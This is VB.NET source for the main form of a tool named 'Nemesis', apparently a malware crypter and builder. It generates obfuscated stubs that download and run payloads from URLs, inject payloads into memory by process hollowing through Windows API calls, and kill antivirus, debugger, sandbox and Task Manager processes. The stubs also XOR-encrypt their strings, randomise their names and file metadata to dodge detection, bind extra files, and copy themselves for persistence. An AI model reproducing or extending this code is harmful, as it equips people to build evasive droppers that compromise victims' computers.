Imports System.Text
Imports System.Text.RegularExpressions
Imports System.IO
Imports System.Reflection
Imports System.Runtime.InteropServices

'//CHANGE 15: Changed Resources.Run, replaced Bitconverter.ToInt32 and .GetBytes with R1, R2, .. R6.

'//CHANGE 16: Changed Resources.API, changed DirectCasting, API declarations, etc.

'//CHANGE 18: Fixed minor compatibility issue in Resources.Run where string was not converted to lowercase.

Public Class Form1

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim o As New OpenFileDialog With {.Filter = "Executable Files (.exe)|*.exe", .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            txtFile.Text = o.FileName
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim Type As String = String.Empty
        If RadioButton1.Checked Then
            Type = "Icon Files (.ico)|*.ico"
        Else
            Type = "Executable Files (.exe)|*.exe"
        End If
        Dim o As New OpenFileDialog With {.Filter = Type, .ShowHelp = True}
        If o.ShowDialog = vbOK Then
            txtIcon.Text = o.FileName
            PictureBox14.Image = Drawing.Icon.ExtractAssociatedIcon(txtIcon.Text).ToBitmap
        End If
    End Sub

    Dim _BD As New StringBuilder, WClient As Boolean = False
    Function _BuildDownloader(ByVal FileName As String, ByVal URL As String, ByVal Action As String, ByVal Folder As String) As String
        Dim InstallationMethod As String = String.Empty
        Dim WebClient As String

        If WClient = False Then
            WebClient = Randomization.RandomPassword.Generate(1, 10)
            _BD.AppendLine("Dim " & WebClient & " As New System.Net.Webclient")
            WClient = True
        End If

        If Action = "HD" Then
            _BD.AppendLine("File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder." & Folder & ") & " & [String]("\" & FileName) & ", " & WebClient & ".DownloadData(" & [String](URL) & "))")
            _BD.AppendLine("Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder." & Folder & ") & " & [String]("\" & FileName) & ")")
        Else
            Action = "Memory"
            _BD.AppendLine(Run(WebClient & ".DownloadData(" & [String](URL) & ")"))
        End If

        Return _BD.ToString
    End Function

    Function _BuildBinder(ByVal FileName As String, ByVal Action As String, ByVal Folder As String, ByVal fileID As Integer) As String
        Dim InstallationMethod As String = String.Empty
        Dim BB As New StringBuilder


        Dim Name As String = Path.GetFileNameWithoutExtension(Path.GetRandomFileName)
        BB.AppendLine("Dim R As New Resources.ResourceManager(" & [String](Name) & ", Assembly.GetExecutingAssembly)")
        BB.AppendLine("Dim S() As String = R.GetObject(" & [String](Name) & ").ToString.Split(" & [String](":") & ")")

        If Action = "HD" Then
            BB.AppendLine("File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder." & Folder & ") & " & [String]("\" & FileName) & ", Encoding.Default.GetBytes(S(" & fileID.ToString & "))")
        ElseIf Action = "Memory" Then
            BB.AppendLine(Run("Encoding.Default.GetBytes(S(" & fileID.ToString & ")"))
        End If

        Return BB.ToString
    End Function

    Function _ProcessBlacklist() As String
        Dim pBlacklist As String = String.Empty
        Dim i As Integer = 0

        For Each p In lbProcessBlacklist.Items
            pBlacklist &= p & "@"
            i += 1
        Next

        Dim PB As New StringBuilder
        With PB
            .AppendLine("For !P1 As Integer = 0 To " & i.ToString)
            .AppendLine("For Each !P3 As System.Diagnostics.Process In System.Diagnostics.Process.GetProcessesByName(!P2(!P1))")
            .AppendLine("!P3.Kill()")
            .AppendLine("Next")
            .AppendLine("Next")
        End With


        PB.Replace("!P2", [String](pBlacklist) & ".Split(" & [String]("@") & ")")
        PB.Replace("!P1", Randomization.RandomPassword.Generate(1, 5))
        PB.Replace("!P3", Randomization.RandomPassword.Generate(1, 5))


        Return PB.ToString
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Application.CurrentCulture = New Globalization.CultureInfo("en-US", False)
        ComboBox1.SelectedIndex = 1
        ComboBox3.SelectedIndex = 0
        ComboBox6.SelectedIndex = 0
        ComboBox7.SelectedIndex = 0
        comboMsgExecution.SelectedIndex = 0
#If Not Debug Then
                If Not File.Exists(Environ$("Temp") & "\HelpDocumentsTrue") Then
            If MessageBox.Show("I see you're using the Nemesis for the first time, would you like to read a help documents?", "Help Documents", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = vbYes Then
                If File.Exists(Application.StartupPath & "\required_data\Guide.rtf") Then
                    Process.Start(Application.StartupPath & "\required_data\Guide.rtf")
                Else : MessageBox.Show("Error, Guide.rtf is not found.", "Unexpected Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                End If
            End If
            System.IO.File.WriteAllText(Environ$("Temp") & "\HelpDocumentsTrue", String.Empty)
        End If
#End If
    End Sub

    Dim _callAntis As String = String.Empty
    Function _CollectAnti()
        Dim Data As String = String.Empty
        Dim i = -1

        'BitDefender
        If cbAntiBitDefender.Checked Then Data &= "" & "@" : i += 1
        'OllyDebug
        If cbAntiOllyDbg.Checked Then Data &= "OllyDbg" & "@" : i += 1
        'SandBoxie
        If cbAntISandBoxie.Checked Then Data &= "SbieCtrl" & "@" : i += 1
        'MalwareByte
        If cbAntiMalwareByte.Checked Then Data &= "mbam" & "@" : i += 1
        'VMWare
        If cbAntiVMWare.Checked Then Data &= "" & "@" : i += 1
        'AVG
        If cbAntiAVG.Checked Then Data &= "" & "@" : i += 1
        'SpyBot S&D
        If cbAntiSpyBot.Checked Then Data &= "" & "@" : i += 1
        'Task Manager
        If cbAntiTaskMgr.Checked Then Data &= "taskmgr" & "@" : i += 1
        'WireShark
        If cbAntiWireShark.Checked Then Data &= "" & "@" : i += 1
        'HijackThis
        If cbAntiHijackThis.Checked Then Data &= "HijackThis" & "@" : i += 1
        'Virtual PC
        If cbAntiVPC.Checked Then Data &= "Virtual PC" & "@" : i += 1
        'Threat Expert
        If cbAntiThreatExpert.Checked Then Data &= "TEMemoryScanner" & "@" : i += 1

        Dim AM As New StringBuilder
        With AM
            .AppendLine("Sub {0}()")
            .AppendLine("On Error Resume Next")
            .AppendLine("Dim {1}() As String = " & [String](Data) & ".Split(" & [String]("@") & ")")
            .AppendLine("For {2} As Integer = 0 To " & i.ToString)
            .AppendLine("For Each {3} As System.Diagnostics.Process In System.Diagnostics.Process.GetProcessesByName({1}({2}))")
            .AppendLine("{3}.Kill()")
            .AppendLine("Next")
            .AppendLine("Next")
            .AppendLine("End Sub")
        End With

        _callAntis = Randomization.RandomPassword.Generate(1, 9)
        AM.Replace("{0}", _callAntis)
        AM.Replace("{1}", Randomization.RandomPassword.Generate(0, 9))
        AM.Replace("{2}", Randomization.RandomPassword.Generate(0, 9))
        AM.Replace("{3}", Randomization.RandomPassword.Generate(0, 9))

        If Not Data = String.Empty Then
            Return AM.ToString
        Else
            Return String.Empty
        End If
    End Function

#Region "MessageBox"
    Dim MessageButton As MessageBoxButtons, MessageStyle As MessageBoxIcon
    Dim MessageBoxButton As String, MessageBoxStyle As String

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        MessageBox.Show(txtMessageBody.Text, txtMessageTitle.Text, MessageButton, MessageStyle)
    End Sub

#Region "MessageBoxButtons {AbortRetryIgnore, OK, RetryCancel, YesNo, OkCancel, YesNoCancel}"
    Private Sub RadioButton13_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton13.CheckedChanged
        MessageButton = MessageBoxButtons.AbortRetryIgnore
        MessageBoxButton = "MessageBoxButtons.AbortRetryIgnore"
    End Sub
    Private Sub RadioButton12_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton12.CheckedChanged
        MessageButton = MessageBoxButtons.OK
        MessageBoxButton = "MessageBoxButtons.OK"
    End Sub
    Private Sub RadioButton10_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton10.CheckedChanged
        MessageButton = MessageBoxButtons.RetryCancel
        MessageBoxButton = "MessageBoxButtons.RetryCancel"
    End Sub
    Private Sub RadioButton14_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton14.CheckedChanged
        MessageButton = MessageBoxButtons.YesNo
        MessageBoxButton = "MessageBoxButtons.YesNo"
    End Sub
    Private Sub RadioButton11_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton11.CheckedChanged
        MessageButton = MessageBoxButtons.OKCancel
        MessageBoxButton = "MessageBoxButtons.OKCancel"
    End Sub
    Private Sub RadioButton15_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton15.CheckedChanged
        MessageButton = MessageBoxButtons.YesNoCancel
        MessageBoxButton = "MessageBoxButtons.YesNoCancel"
    End Sub
#End Region

#Region "MessageBoxStyle {None, Error, Warning, Information, Question}"
    Private Sub RadioButton4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton4.CheckedChanged
        MessageStyle = MessageBoxIcon.None
        MessageBoxStyle = "MessageBoxIcon.None"
    End Sub
    Private Sub RadioButton6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton6.CheckedChanged
        MessageStyle = MessageBoxIcon.Error
        MessageBoxStyle = "MessageBoxIcon.Error"
    End Sub
    Private Sub RadioButton8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton8.CheckedChanged
        MessageStyle = MessageBoxIcon.Warning
        MessageBoxStyle = "MessageBoxIcon.Warning"
    End Sub
    Private Sub RadioButton5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton5.CheckedChanged
        MessageStyle = MessageBoxIcon.Information
        MessageBoxStyle = "MessageBoxIcon.Information"
    End Sub
    Private Sub RadioButton3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton3.CheckedChanged
        MessageStyle = MessageBoxIcon.Question
        MessageBoxStyle = "MessageBoxIcon.Question"
    End Sub
#End Region

#End Region

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        If String.IsNullOrEmpty(txtProcess.Text) Then Exit Sub
        lbProcessBlacklist.Items.Add(txtProcess.Text)
        txtProcess.Clear()
    End Sub
    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        lbProcessBlacklist.Items.Clear()
    End Sub
    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        lbProcessBlacklist.Items.Remove(lbProcessBlacklist.SelectedItem)
    End Sub

    Private Sub cbSelectAllAnti_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbSelectAllAnti.CheckedChanged
        If cbSelectAllAnti.Checked Then
            cbAntiAVG.Checked = True
            cbAntiBitDefender.Checked = True
            cbAntiHijackThis.Checked = True
            cbAntiMalwareByte.Checked = True
            cbAntiOllyDbg.Checked = True
            cbAntISandBoxie.Checked = True
            cbAntiSpyBot.Checked = True
            cbAntiTaskMgr.Checked = True
            cbAntiVMWare.Checked = True
            cbAntiWireShark.Checked = True
            cbAntiVPC.Checked = True
            cbAntiThreatExpert.Checked = True
        Else
            cbAntiAVG.Checked = False
            cbAntiBitDefender.Checked = False
            cbAntiHijackThis.Checked = False
            cbAntiMalwareByte.Checked = False
            cbAntiOllyDbg.Checked = False
            cbAntISandBoxie.Checked = False
            cbAntiSpyBot.Checked = False
            cbAntiTaskMgr.Checked = False
            cbAntiVMWare.Checked = False
            cbAntiWireShark.Checked = False
            cbAntiVPC.Checked = False
            cbAntiThreatExpert.Checked = False
        End If
    End Sub

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        txtTitleA.Text = Randomization.RandomPassword.Generate(5, 10)
        txtDescription.Text = Randomization.RandomPassword.Generate(5, 10)
        txtProduct.Text = Randomization.RandomPassword.Generate(5, 10)
        txtCompany.Text = Randomization.RandomPassword.Generate(5, 10)
        txtTrademark.Text = Randomization.RandomPassword.Generate(5, 10)
        txtCopyright.Text = Randomization.RandomPassword.Generate(5, 10)
        txtnumb1.Text = Base.Engine.Random(0, 50).ToString
        txtnumb2.Text = Base.Engine.Random(0, 55).ToString
        txtnumb3.Text = Base.Engine.Random(0, 60).ToString
        txtnumb4.Text = Base.Engine.Random(0, 65).ToString
    End Sub

    Dim Content, Headers, Methods As StringBuilder
    Function AssemblyEditor() As String
        Dim Editor As String = My.Resources.AssemblyEditor.ToString
        Editor = Editor.Replace("{1}", txtTitleA.Text)
        Editor = Editor.Replace("{2}", txtDescription.Text)
        Editor = Editor.Replace("{3}", txtCompany.Text)
        Editor = Editor.Replace("{4}", txtProduct.Text)
        Editor = Editor.Replace("{5}", txtCopyright.Text)
        Editor = Editor.Replace("{6}", txtTrademark.Text)
        Editor = Editor.Replace("{7}", txtnumb1.Text)
        Editor = Editor.Replace("{8}", txtnumb2.Text)
        Editor = Editor.Replace("{9}", txtnumb3.Text)
        Editor = Editor.Replace("{10}", txtnumb4.Text)
        Return Editor
    End Function

    Sub Header(ByVal ParamArray names As String())
        For Each name As String In names
            If Not Headers.ToString.Contains(name & "!") Then Headers.AppendLine("Imports " & name & "!")
        Next
    End Sub
    Dim RunR As Base.Engine.Routine, RunM As Base.Engine.Module, RunSet As Boolean
    Function Run(ByVal instance As String) As String
        If Not RunSet Then
            RunR = Base.Generator.Transform("ByVal !N1 As Byte()")

            '//CHANGE 13: Implemented GetInt32 and GetBytes
            Dim Code As String = Replace(My.Resources.Run, {"!P1", RunR.Declaration},
            {"!S1", [String](":\Program Files (x86)")}, {"!S2", [String](":\Windows\Microsoft.NET\Framework")},
            {"!S3", [String]("v2.0.")}, {"!S4", [String]("\cvtres.exe")}, {"!R1", GetInt32("60")}, {"!R2", GetInt32("?N5 + 84")},
            {"!R3", GetInt32("?N5 + 52")}, {"!R4", GetInt32("?N5 + 80")}, {"!R5", GetBytes("?N11.ToInt32")},
            {"!R6", GetInt32("?N5 + 40")})

            RunM = Base.Generator.Parse(ParseAPI(Code,
                     {"?N21", "kernel32:CreateProcessA"}, {"?N22", "kernel32:GetThreadContext"},
                     {"?N23", "kernel32:ReadProcessMemory"}, {"?N24", "ntdll:NtUnmapViewOfSection"},
                     {"?N25", "kernel32:VirtualAllocEx"}, {"?N26", "kernel32:WriteProcessMemory"},
                     {"?N22", "kernel32:SetThreadContext"}, {"?N27", "kernel32:ResumeThread"}))

            Methods.AppendLine(RunM.Code)
            RunSet = True
        End If
        Return String.Format("{0}({1})", RunM.Names(0), RunR.ToString(Guard(instance)))
    End Function

    Dim GuardM As Base.Engine.Module, GuardR As Base.Engine.Routine, GuardSet As Boolean
    Function Guard(ByVal instance As String) As String
        If Not GuardSet Then
            GuardR = Base.Generator.Transform("ByVal ?N1 As Byte()")
            GuardM = Base.Generator.Parse(Replace(My.Resources.XOR_, {"!P1", GuardR.Declaration}, {"!R1", KeyString()}))
            Methods.AppendLine(GuardM.Code)
            GuardSet = True
        End If
        Return String.Format("{0}({1})", GuardM.Names(0), GuardR.ToString(instance))
    End Function
    Sub GenerateKey()
        Base.Key = New Byte(Base.Engine.Random(8, 20)) {}
        Dim R As New System.Random
        R.NextBytes(Base.Key)
    End Sub
    Function KeyString() As String
        Dim T As New StringBuilder("New Byte(){")
        For I As Integer = 0 To Base.Key.Length - 1
            T.AppendFormat("{0},", Base.Key(I))
        Next
        T.Remove(T.Length - 1, 1)
        Return T.ToString & "}"
    End Function

    Dim NumericR As Base.Engine.Routine, NumericM As Base.Engine.Module, NumericSet As Boolean
    Function Numeric(ByVal instance As String) As String
        If Not NumericSet Then
            NumericR = Base.Generator.Transform("ByVal ?N1 As Object()")
            NumericM = Base.Generator.Parse(My.Resources.Numeric.Replace("!P1", NumericR.Declaration))
            Methods.AppendLine(NumericM.Code)
            NumericSet = True
        End If
        Return String.Format("{0}({1})", NumericM.Names(0), NumericR.ToString("New Object(){" & instance & "}"))
    End Function

    Dim DecodeR As Base.Engine.Routine, DecodeM As Base.Engine.Module, DecodeSet As Boolean
    Function Decode(ByVal instance As String) As String
        If Not DecodeSet Then
            Header("System.Collections.Generic")
            DecodeR = Base.Generator.Transform("ByVal ?N1 As String")
            DecodeM = Base.Generator.Parse(My.Resources.Decode.Replace("!P1", DecodeR.Declaration))
            Methods.AppendLine(DecodeM.Code)
            DecodeSet = True
        End If
        Return String.Format("{0}({1})", DecodeM.Names(0), DecodeR.ToString(instance))
    End Function

    Dim ManagedR, ManagedN As String, ManagedSet As Boolean
    Function Managed(ByVal instance As String) As String
        If Not ManagedSet Then
            Header("System.Resources")
            ManagedN = Base.Generator.Name
            Content.AppendFormat("Dim {0} As New ResourceManager(""{1}"", Assembly.GetExecutingAssembly)",
                                 ManagedN, Path.GetFileNameWithoutExtension(ManagedR))
            Content.AppendLine()
            ManagedSet = True
        End If
        Return String.Format("DirectCast({0}.GetObject({1}), Byte())", ManagedN, [String](instance))
    End Function

    Dim NativeM As Base.Engine.Module, NativeR As Base.Engine.Routine, NativeSet As Boolean
    Function Native(ByVal instance As String) As String
        If Not NativeSet Then
            Header("System.Runtime.InteropServices")
            NativeR = Base.Generator.Transform("ByVal ?N1 As String")

            '//CHANGE 9: Replaced 'RT_RCDATA' with 'RC_IMAGE'
            Dim Code As String = Replace(My.Resources.Native, {"!P1", NativeR.Declaration}, {"!S1", [String]("RC_IMAGE")})

            NativeM = Base.Generator.Parse(ParseAPI(Code,
                      {"?N5", "kernel32:GetModuleHandleA"}, {"?N6", "kernel32:FindResourceA"},
                      {"?N7", "kernel32:SizeofResource"}, {"?N8", "kernel32:LoadResource"}))

            Methods.AppendLine(NativeM.Code)
            NativeSet = True
        End If
        Return String.Format("{0}({1})", NativeM.Names(0), NativeR.ToString([String](instance)))
    End Function

    Dim APIM As Base.Engine.Module, APIR As Base.Engine.Routine, APISet As Boolean
    Function API(ByVal [delegate] As String, ByVal [function] As String) As String
        If Not APISet Then
            APIR = Base.Generator.Transform("ByVal ?N3 As String")
            APIM = Base.Generator.Parse(Replace(My.Resources.API, {"!P1", APIR.Declaration},
                   {"!R1", If(Base.Engine.Random > 0.5, "LoadLibrary", "GetModuleHandle")}))
            Methods.AppendLine(APIM.Code)
            APISet = True
        End If
        Return String.Format("{0}(Of {1})({2})", APIM.Names(0), [delegate], APIR.ToString([String]([function])))
    End Function
    Function ParseAPI(ByVal data As String, ByVal ParamArray items As String()()) As String
        Dim T As Integer
        For Each I As String() In items
            T += 1
            data = data.Replace("!D" & T, API(I(0), I(1)))
        Next
        Return data
    End Function

    '//CHANGE 10: Added new method to check for 64bit machines. Unused, but here when you need it!
    Dim Wow64M As Base.Engine.Module, Wow64R As Base.Engine.Routine, Wow64Set As Boolean
    Function Wow64() As String
        If Not Wow64Set Then
            Wow64R = Base.Generator.Transform()
            Wow64M = Base.Generator.Parse(Replace(My.Resources.Wow64, {"!P1", Wow64R.Declaration},
                                                  {"!D1", API("?N3", "kernel32:IsWow64Process")}))
            Methods.AppendLine(Wow64M.Code)
            Wow64Set = True
        End If
        Return String.Format("{0}({1})", Wow64M.Names(0), Wow64M.ToString)
    End Function

    '//CHANGE 11: Added new method to replace BitConvert.ToInt32
    Dim Int32R As Base.Engine.Routine, Int32M As Base.Engine.Module, Int32Set As Boolean
    Function GetInt32(ByVal index As String) As String
        If Not Int32Set Then
            Int32R = Base.Generator.Transform("ByVal ?N1 As Byte()", "ByVal ?N2 As Integer")
            Int32M = Base.Generator.Parse(My.Resources.ToInt32.Replace("!P1", Int32R.Declaration))
            Methods.AppendLine(Int32M.Code)
            Int32Set = True
        End If
        Return String.Format("{0}({1})", Int32M.Names(0), Int32R.ToString("!N1", index))
    End Function

    '//CHANGE 12: Added new method to replace BitConvert.GetBytes
    Dim BytesR As Base.Engine.Routine, BytesM As Base.Engine.Module, BytesSet As Boolean
    Function GetBytes(ByVal value As String) As String
        If Not BytesSet Then
            BytesR = Base.Generator.Transform("ByVal ?N1 As Integer")
            BytesM = Base.Generator.Parse(My.Resources.GetBytes.Replace("!P1", BytesR.Declaration))
            Methods.AppendLine(BytesM.Code)
            BytesSet = True
        End If
        Return String.Format("{0}({1})", BytesM.Names(0), BytesR.ToString(value))
    End Function

    Dim StringM As Base.Engine.Module, StringR As Base.Engine.Routine, StringSet As Boolean
    Function [String](ByVal instance As String) As String
        If Not StringSet Then
            StringR = Base.Generator.Transform("ByVal ?N1 As String")
            StringM = Base.Generator.Parse(Replace(My.Resources.String_, {"!P1", StringR.Declaration}, {"!R1", Guard("Convert.FromBase64String(?N1)")}))
            Methods.AppendLine(StringM.Code)
            StringSet = True
        End If
        Return String.Format("{0}({1})", StringM.Names(0), StringR.ToString(GuardString(instance)))
    End Function
    Function GuardString(ByVal instance As String) As String
        Return """" & Convert.ToBase64String(Base.[XOR](Encoding.UTF8.GetBytes(instance))) & """"
    End Function

    Function Replace(ByVal data As String, ByVal ParamArray items As String()()) As String
        For Each I As String() In items
            data = data.Replace(I(0), I(1))
        Next
        Return data
    End Function
    Function FilePath(ByVal extension As String) As String
        Return Path.ChangeExtension(Path.Combine(Path.GetTempPath, Path.GetRandomFileName), extension)
    End Function

#Region "EOF Function"
    Public Function ReadEOFData(ByRef FilePath As String) As String
        On Error GoTo errorhandle
        Dim sEOFBuf, sFileBuf, sChar As String
        Dim lPos2, lFF, lPos, lCount As Integer
        If Dir(FilePath) = "" Then GoTo errorhandle
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        sFileBuf = Space(LOF(lFF))
        FileGet(lFF, sFileBuf)
        FileClose(lFF)
        lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
        sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
        ReadEOFData = StrReverse(sEOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
errorhandle:
        ReadEOFData = String.Empty
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim sBuf As String = ""
        Dim i As Short
        For i = 1 To lNum
            sBuf = sBuf & Chr(0)
        Next
        GetNullBytes = sBuf
    End Function
    Sub WriteEOFData(ByRef FilePath As String, ByRef EOFData As String)
        Dim sFileBuf As String
        Dim lFF As Integer
        On Error Resume Next
        If Dir(FilePath) = "" Then Exit Sub
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        sFileBuf = Space(LOF(lFF))
        FileGet(lFF, sFileBuf)
        FileClose(lFF)
        Kill(FilePath)
        lFF = FreeFile()
        FileOpen(lFF, FilePath, OpenMode.Binary)
        FilePut(lFF, sFileBuf & EOFData)
        FileClose(lFF)
    End Sub
#End Region

    Private Function InstallFile(ByVal Destination As String, ByVal Name As String) As String
        Dim SB As New StringBuilder
        With SB
            .AppendLine("Dim {0} As String = Environment.GetFolderPath(Environment.SpecialFolder." & Destination & ") & " & [String]("\" & Name & ".exe"))
            .AppendLine("If Not Application.ExecutablePath = {0} Then")
            .AppendLine("File.Copy(Application.ExecutablePath, {0})")
            .AppendLine("System.Diagnostics.Process.Start({0})")
            .AppendLine("End")
            .AppendLine("End If")
        End With
        SB.Replace("{0}", Randomization.RandomPassword.Generate(1, 5))
        Return SB.ToString
    End Function

#Region "UI Objects"
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        txtBootName.Text = Randomization.RandomPassword.Generate(4, 10)
    End Sub
    Private Sub CheckBox13_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox13.CheckedChanged
        If CheckBox13.Checked Then
            ComboBox3.Enabled = True
            ComboBox4.Enabled = True
        Else
            ComboBox3.Enabled = False
            ComboBox4.Enabled = False
        End If
    End Sub
    Private Sub CheckBox8_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbBootWindows.CheckedChanged
        If cbBootWindows.Checked Then
            cbBootCU.Enabled = True
            cbBootLM.Enabled = True
            txtBootFolder.Enabled = True
            txtBootName.Enabled = True
            Button3.Enabled = True
        Else
            cbBootCU.Enabled = False
            cbBootLM.Enabled = False
            txtBootFolder.Enabled = False
            txtBootName.Enabled = False
            Button3.Enabled = False
        End If
    End Sub
    Private Sub CheckBox12_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbMessageBox.CheckedChanged
        If cbMessageBox.Checked Then
            GroupBox8.Enabled = True
            GroupBox6.Enabled = True
            GroupBox7.Enabled = True
            GroupBox14.Enabled = True
        Else
            GroupBox8.Enabled = False
            GroupBox6.Enabled = False
            GroupBox7.Enabled = False
            GroupBox14.Enabled = False
        End If
    End Sub
    Private Sub CheckBox7_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbVisitUrl.CheckedChanged
        If cbVisitUrl.Checked Then
            txtVisitUrl.Enabled = True
        Else
            txtVisitUrl.Enabled = False
        End If
    End Sub
    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        If String.IsNullOrEmpty(ComboBox7.Text) Then Exit Sub
        ListView1.Items.Add(ComboBox7.Text)
        ComboBox7.Text = String.Empty
    End Sub
    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        For Each I As ListViewItem In ListView1.SelectedItems
            I.Remove()
        Next
    End Sub

    Private Sub CheckBox16_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cbBlockSites.CheckedChanged
        If cbBlockSites.Checked Then
            Button10.Enabled = True
            Button11.Enabled = True
            ComboBox7.Enabled = True
            Button16.Enabled = True
        Else
            Button10.Enabled = False
            Button11.Enabled = False
            ComboBox7.Enabled = False
            Button16.Enabled = True
        End If
    End Sub
#End Region

    Private Sub Button12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button12.Click
        FormScanner.Show()
    End Sub

    Private Sub BinderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BinderToolStripMenuItem.Click
        Dim newBind As New FormBinder
        newBind.Show()
    End Sub

    Private Sub ClearToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearToolStripMenuItem.Click
        ListView2.Items.Clear()
    End Sub

    Private Sub DownloaderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloaderToolStripMenuItem.Click
        Dim newDownload As New FormDownloader
        newDownload.Show()
    End Sub

#Region "File Joiner - Settings"
    Private Sub HDDToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HDDToolStripMenuItem.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            F.SubItems(3).Text = "HDD"
            F.SubItems(4).Text = "ApplicationData"
        Next
    End Sub
    Private Sub MemoryToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MemoryToolStripMenuItem.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            F.SubItems(3).Text = "Memory"
            F.SubItems(4).Text = "N/A"
        Next
    End Sub
    Private Sub cb2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb2.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "ApplicationData"
        Next
    End Sub
    Private Sub cb1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb1.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Templates"
        Next
    End Sub
    Private Sub cb3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb3.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "CommonApplicationData"
        Next
    End Sub
    Private Sub cb4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb4.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Desktop"
        Next
    End Sub
    Private Sub cb5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb5.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "Favorites"
        Next
    End Sub
    Private Sub cb6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb6.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "History"
        Next
    End Sub
    Private Sub cb7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb7.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "InternetCache"
        Next
    End Sub
    Private Sub cb15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb15.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "LocalApplicationData"
        Next
    End Sub
    Private Sub cb8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb8.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "MyDocuments"
        Next
    End Sub
    Private Sub cb9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb9.Click
        For Each F As ListViewItem In ListView2.SelectedItems
            If F.SubItems(3).Text = "Memory" Then Exit Sub
            F.SubItems(4).Text = "MyMusic"
        Next
    End Sub
    Private Sub cb10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb10.Click
